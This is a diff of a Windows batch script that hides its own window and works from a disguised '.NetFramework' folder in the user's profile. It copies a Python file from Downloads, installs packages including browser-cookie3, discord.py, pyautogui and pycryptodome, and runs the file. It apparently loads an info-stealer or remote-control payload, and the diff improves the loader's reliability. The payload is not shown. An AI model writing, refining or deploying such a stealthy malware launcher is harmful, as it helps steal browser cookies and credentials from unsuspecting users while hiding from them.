@@ -4,7 +4,7 @@ powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidd
 exit
 
 :start
-setlocal
+setlocal enabledelayedexpansion
 
 set "WORKDIR=%LOCALAPPDATA%\.NetFramework"
 set "DOWNLOADS=%USERPROFILE%\Downloads"
@@ -22,12 +22,28 @@ if exist "%DOWNLOADS%\%PYFILE%" (
 
 cd /d "%WORKDIR%"
 
-python -m venv venv
+:: Check if python is installed
+python --version >nul 2>&1
+if errorlevel 1 (
+    echo Python is not installed. Please install Python 3.6 or higher.
+    exit /b 1
+)
+
+:: Create virtual environment if it doesn't exist
+if not exist "venv\Scripts\activate.bat" (
+    python -m venv venv
+    if errorlevel 1 exit /b 1
+)
+
+:: Activate venv and install packages
+call "%WORKDIR%\venv\Scripts\activate.bat"
+python -m pip install --upgrade pip
 if errorlevel 1 exit /b 1
 
-powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python -m pip install --upgrade pip; pip install requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3"
+python -m pip install --upgrade requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3
 if errorlevel 1 exit /b 1
 
-powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python \"%WORKDIR%\%PYFILE%\""
+:: Run the python script
+python "%WORKDIR%\%PYFILE%"
 
 exit
